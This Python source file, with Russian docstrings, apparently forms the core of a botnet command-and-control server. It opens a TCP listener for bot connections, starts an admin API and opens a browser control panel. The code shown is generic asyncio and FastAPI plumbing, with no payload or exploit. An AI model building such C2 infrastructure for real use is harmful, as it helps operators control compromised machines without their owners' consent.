# backend/Core/Server.py

import asyncio
import webbrowser
from typing import List, Optional

from backend.Config import STORAGE_DIR, IP, PORT, API_PORT
import backend.LoggerWrapper as logger
from backend import start_benchmark
from backend.API.api import run_fastapi_server
from backend.Core.ClientConnection import BotConnectionHandler

logger.Log.setup(str(STORAGE_DIR / "server.log"))


class CommandControlServer:
    """
    Класс управления центральным сервером управления (Command and Control).
    Обеспечивает запуск TCP-слушателя для ботов и HTTP-сервера для API.
    """

    def __init__(self) -> None:
        """Инициализация ресурсов экземпляра сервера."""
        self.tcp_server: Optional[asyncio.AbstractServer] = None

    async def start_engine(self) -> None:
        """
        Запускает основной сетевой цикл, API сервер и браузерную панель управления.
        """
        connection_handler: BotConnectionHandler = BotConnectionHandler()

        self.tcp_server = await asyncio.start_server(
            connection_handler.handle_new_connection,
            IP,
            PORT,
            reuse_address=True,
            backlog=1000,
            limit=10 * 1024 * 1024
        )

        logger.Log.info(f"[{self.__class__.__name__}] TCP Infrastructure started on {IP}:{PORT}")

        api_server_tasks: List[asyncio.Task] = [
            asyncio.create_task(run_fastapi_server(IP, API_PORT))
        ]

        start_benchmark(asyncio.get_running_loop())

        administration_url: str = f"http://127.0.0.1:{API_PORT}/"
        logger.Log.info(f"[{self.__class__.__name__}] API Infrastructure launching at {administration_url}")

        await asyncio.sleep(1)
        webbrowser.open(administration_url)

        async with self.tcp_server:
            try:
                await asyncio.gather(self.tcp_server.serve_forever(), *api_server_tasks)
            except asyncio.CancelledError:
                logger.Log.warning(f"[{self.__class__.__name__}] Critical Shutdown initiated...")
            finally:
                for running_task in api_server_tasks:
                    running_task.cancel()
                
                await asyncio.gather(*api_server_tasks, return_exceptions=True)
                logger.Log.info(f"[{self.__class__.__name__}] All server components stopped.")


async def start_server() -> None:
    """
    Глобальная точка входа для инициализации и запуска сервера.
    """
    server_instance: CommandControlServer = CommandControlServer()
    await server_instance.start_engine()